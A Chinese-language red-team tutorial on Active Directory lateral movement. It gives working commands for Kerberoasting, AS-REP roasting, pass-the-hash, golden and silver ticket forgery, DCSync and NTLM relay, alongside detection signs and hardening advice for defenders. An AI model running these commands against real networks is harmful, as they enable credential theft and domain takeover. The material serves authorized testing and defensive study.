# 内网横向渗透：Kerberos 与域内移动

## 1. Active Directory 基础

AD 域是企业内网最常见的身份管理系统，核心组件：

- **域控（DC）**：AD 数据库、DNS、Kerberos KDC
- **用户/组/计算机/组织单位（OU）**
- **组策略（GPO）**：管理计算机与用户策略
- **SYSVOL 共享**：存放 GPO，所有域内用户可读
- **NTDS.dit**：域控数据库文件，含所有账号密码哈希

## 2. Kerberos 协议流程

```
AS_REQ → AS_REP (TGT) → TGS_REQ → TGS_REP (ST) → AP_REQ → 服务验证
```

- **TGT（Ticket Granting Ticket）**：用户登录 KDC 颁发的票据，缓存于 LSASS
- **ST（Service Ticket / TGS Ticket）**：用 TGT 向 KDC 申请的访问某个服务的票据
- **PAC（Privilege Attribute Certificate）**：票据中的权限声明，含用户组信息

## 3. 常见域内攻击手段

### 3.1 Kerberoasting

原理：用户可对任意设置了 SPN（Service Principal Name）的服务账号申请 TGS 票据，而 TGS 用该服务账号的 NT Hash 加密。将 TGS 离线爆破即可获得服务账号密码。

```bash
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Impacket
GetUserSPNs.py domain.local/user:pass -request -outputfile kerberoast.txt

# hashcat 爆破
hashcat -m 13100 kerberoast.txt wordlist.txt -O
```

**检测特征**：大量 `4769` 事件，加密类型为 RC4-HMAC（0x17），且请求源非该服务常规主机

### 3.2 AS-REP Roasting

原理：若某用户启用了「不需要 Kerberos 预认证」，攻击者可直接向 KDC 请求该用户的 AS_REP，用用户密码加密。离线爆破。

```bash
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

### 3.3 Pass-the-Hash (PtH)

原理：Windows NTLM 协议中，只要拥有用户 NT Hash，即可发起认证，不需要明文密码。

```bash
# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u admin -H :AABBCCDD... --local-auth

# psexec / smbexec / wmiexec
wmiexec.py -hashes :AABBCCDD... domain/admin@10.0.0.5

# RDP
xfreerdp /u:admin /pth:AABBCCDD... /v:10.0.0.5 +compression +fonts
```

### 3.4 Pass-the-Ticket (PtT) / Golden Ticket

原理：伪造合法的 TGT 票据，可访问任何服务。需要 `krbtgt` 账号的 NT Hash。

```bash
# mimikatz
kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-1111111-22222222-33333333 /krbtgt:ntlm_hash_here /id:500 /groups:512,513,518,519 /ptt

# 然后即可用该 TGT 访问 DC
misc::cmd
dir \\dc01.domain.local\c$
```

**检测**：目标账户 TGT 请求无对应 AS_REQ / 非域控主机使用 krbtgt 账户发起请求

### 3.5 Silver Ticket

原理：伪造某个服务的 ST（TGS）。需要该服务账号的 NT Hash，只能访问该服务。

```bash
kerberos::silver /user:admin /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:cifs /rc4:ntlm_hash_here /ptt
```

### 3.6 DCSync

原理：模拟域控向目标域控发起复制请求（需要高权限：域管或 DS-Replication-Get-Changes 权限），拉取所有用户 NTLM。

```bash
# mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt

# Impacket
secretsdump.py domain/admin:pass@10.0.0.1 -just-dc-user krbtgt
secretsdump.py domain/admin:pass@10.0.0.1 -just-dc-ntlm
```

### 3.7 NTLM Relay

原理：在能中间人劫持 NTLM 认证的场景下，将某用户的 NTLM 认证请求中继至其他服务。

```bash
# Responder + ntlmrelayx
responder -I eth0 -d -w
ntlmrelayx.py -tf targets.txt -smb2support
```

## 4. 常见横向工具速查

```bash
# 批量信息收集
BloodHound / SharpHound
python3 bloodhound.py -c all -u user -p pass -d domain.local -ns 10.0.0.1

# 凭据导出 - Linux
impacket-secretsdump

# 横向访问
impacket-wmiexec / smbexec / psexec / dcomexec
evil-winrm -i 10.0.0.5 -u admin -H :hash

# RDP
proxychains xfreerdp ...

# SSH
crackmapexec ssh 10.0.0.0/24 -u root -p password
```

## 5. 防御建议

- 强口令策略，杜绝弱口令（尤其是服务账号）
- 服务账号启用「账户敏感，无法被委派」
- 组策略：`Network security: LAN Manager authentication level` → 仅发送 NTLMv2
- 启用 Kerberos AES（禁用 RC4-HMAC-MD5）
- LDAP signing / LDAPS 要求
- 禁用 NTLM 认证（如能迁移到 Kerberos）
- 监控并告警大量 4769（Kerberoasting）事件
- 限制本地管理员账号重复使用（LAPS）
- 启用 Windows Defender Credential Guard（隔离 LSASS）
- 定期清理高权限组（Domain Admins / Enterprise Admins）

---

> 以上技术仅用于合法授权的红蓝对抗演练。未授权使用属违法。
